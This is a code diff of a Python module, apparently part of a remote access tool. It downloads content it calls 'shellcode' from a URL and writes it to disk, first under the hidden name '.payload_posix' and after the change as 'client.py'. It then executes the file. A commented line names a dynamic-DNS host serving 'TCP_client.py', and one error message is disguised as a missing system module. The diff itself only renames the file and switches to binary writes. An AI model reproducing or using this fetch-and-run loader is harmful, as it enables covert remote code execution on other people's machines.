@@ -41,7 +41,7 @@ def run(**args):
       bin = False
       ScriptExec = "python3.5 "
       #url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
-      OsTargetpath = ".payload_posix"
+      OsTargetpath = "client.py"
   else:
       return "[ERROR] getFileFromURI: Not recognised OS!"
 
@@ -49,7 +49,7 @@ def run(**args):
     http = urllib3.PoolManager()
     #The HTTPResponse object provides status, data, and header attributes:
     r = http.request('GET', url)
-    shellcode = r.data.decode('utf-8')
+    shellcode = r.data
   except urllib3.exceptions.MaxRetryError:
   	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
   	return "getFileFromURI: HTTP Error 404: File not found"
@@ -62,19 +62,18 @@ def run(**args):
   if bin:
     mon_fichier = open(OsTargetpath, "wb")
     mon_fichier.write(shellcode)
-    print(len(shellcode))
     mon_fichier.close()
     cmd= "./{}".format(OsTargetpath)
   else:
     try:
-        mon_fichier = open(OsTargetpath, "w")
-        print("*********** Before Writing *********")
+        print("*********** Before Writing in %s *********"%OsTargetpath)
+        mon_fichier = open(OsTargetpath, "wb")
         mon_fichier.write(shellcode)
         print("*********** After Writing *********")
         time.sleep(1)
         mon_fichier.close()
     except:
-        print("[Error] RunScriptFromGit: could not create Targetscript")
+        print("[Error] getFileFromURI: could not create Targetscript")
         return " modules/_bootlocale not found!!"
     cmd= ScriptExec+" "+OsTargetpath
 
